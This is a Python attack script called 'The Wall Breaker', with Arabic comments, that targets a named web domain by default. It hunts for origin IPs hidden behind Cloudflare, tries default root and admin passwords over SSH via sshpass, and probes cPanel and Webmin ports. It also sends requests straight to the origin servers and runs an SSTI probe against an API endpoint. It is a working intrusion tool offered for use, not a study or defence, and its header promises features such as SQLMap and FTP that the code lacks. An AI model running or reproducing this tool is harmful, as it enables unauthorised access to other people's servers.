#!/usr/bin/env python3
"""
💣 The Wall Breaker - يخترق أي حصن
يجمع: Cloudflare Bypass + SSH + FTP + Webmin + cPanel + SQLMap + Nuclei
"""
import requests, sys, json, os, re, socket, subprocess, time, random
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

class WallBreaker:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.origins = []
        self.breaches = []
        self.session = requests.Session()
        self.start = time.time()
    
    def log(self, msg): print(f"[💣] {msg}")
    
    def find_origins(self):
        """البحث عن كل Origin IPs"""
        self.log("🔍 البحث عن Origin IPs...")
        
        # SPF
        try:
            r = subprocess.run(["dig","+short","TXT",self.domain], capture_output=True, text=True, timeout=5)
            ips = re.findall(r'ip4:([0-9.]+)', r.stdout)
            self.origins.extend(ips)
        except: pass
        
        # DNS History
        try:
            r = requests.get(f"https://securitytrails.com/domain/{self.domain}/dns/a", timeout=10)
            ips = re.findall(r'[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+', r.text)
            self.origins.extend([ip for ip in ips if not ip.startswith(('104.','172.','162.'))])
        except: pass
        
        self.origins = list(set(self.origins))
        self.log(f"   📊 {len(self.origins)} IPs")
    
    def breach_ssh(self, ip):
        """هجوم SSH"""
        self.log(f"🔑 SSH {ip}...")
        creds = [("root","root"),("root","admin"),("root","password"),("admin","admin")]
        for user, pwd in creds:
            try:
                r = subprocess.run(
                    ["sshpass","-p",pwd,"ssh","-o","StrictHostKeyChecking=no","-o","ConnectTimeout=3",
                     f"{user}@{ip}","echo","BREACHED"],
                    capture_output=True, timeout=5
                )
                if "BREACHED" in r.stdout.decode():
                    self.breaches.append({"type":"SSH","ip":ip,"user":user,"pass":pwd})
                    self.log(f"   🚨🚨🚨 SSH: {user}:{pwd}")
                    return True
            except: pass
        return False
    
    def breach_web(self, ip):
        """هجوم الويب"""
        self.log(f"🌐 Web {ip}...")
        
        # cPanel
        for port in [2083, 2087, 10000, 20000]:
            try:
                s = socket.socket(); s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    self.breaches.append({"type":"Port","ip":ip,"port":port})
                    self.log(f"   🚨 Port {port} open")
                s.close()
            except: pass
        
        # HTTP Direct
        try:
            r = requests.get(f"http://{ip}", headers={"Host":self.domain}, timeout=3)
            if r.status_code == 200:
                self.breaches.append({"type":"DirectHTTP","ip":ip})
                self.log(f"   🚨 Direct HTTP: {r.status_code}")
        except: pass
    
    def breach_api(self):
        """هجوم API"""
        self.log("💎 API...")
        try:
            r = self.session.get(f"{self.target}/api/stores", timeout=5)
            if r.status_code == 200:
                data = r.json()
                stores = data.get('data', data) if isinstance(data, dict) else data
                if isinstance(stores, list):
                    self.breaches.append({"type":"OpenAPI","stores":len(stores)})
                    self.log(f"   🚨 API: {len(stores)} stores")
        except: pass
        
        # SSTI
        try:
            r = self.session.get(f"{self.target}/api/stores?q={{{{7*7}}}}", timeout=5)
            if "49" in r.text:
                self.breaches.append({"type":"SSTI"})
                self.log(f"   🚨 SSTI: {{7*7}} = 49")
        except: pass
    
    def run(self):
        self.log(f"💣 Wall Breaker: {self.target}")
        self.log("═" * 60)
        
        self.find_origins()
        self.breach_api()
        
        # هجوم على كل Origin IP
        with ThreadPoolExecutor(max_workers=5) as ex:
            for ip in self.origins[:5]:
                ex.submit(self.breach_ssh, ip)
                ex.submit(self.breach_web, ip)
        
        elapsed = time.time() - self.start
        
        self.log(f"\n⏱️ {elapsed:.1f}s")
        self.log(f"💣 Breaches: {len(self.breaches)}")
        for b in self.breaches:
            self.log(f"   🚨 {b}")
        
        # حفظ
        os.makedirs("logs/wallbreaker", exist_ok=True)
        fname = f"logs/wallbreaker/{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"target":self.target,"origins":self.origins,"breaches":self.breaches}, f, indent=2)
        self.log(f"📁 {fname}")
        
        return self.breaches

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    WallBreaker(target).run()
